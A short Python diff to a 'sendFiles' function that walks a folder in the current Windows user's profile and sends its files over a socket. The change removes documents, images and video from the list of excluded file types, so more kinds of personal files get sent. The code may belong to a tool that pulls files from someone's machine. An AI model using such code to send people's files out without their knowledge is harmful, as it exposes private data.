@@ -78,7 +78,7 @@ def sendFiles(filedir: str):
             msg = suck.recv(1024).decode("utf-8")
             if msg == "FILE_count_recv": break
 
-        bannedtypes = [".lnk", ".rdp", ".ini",".webp",".gif",".mp4",".docx", ".crdownload"]
+        bannedtypes = [".lnk", ".rdp", ".ini", ".crdownload"]
         for filename in listdir(full_path): # Get each file in folder
             if isfile("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename) and not filename.endswith(tuple(bannedtypes)):
                 data = f"{filename}"
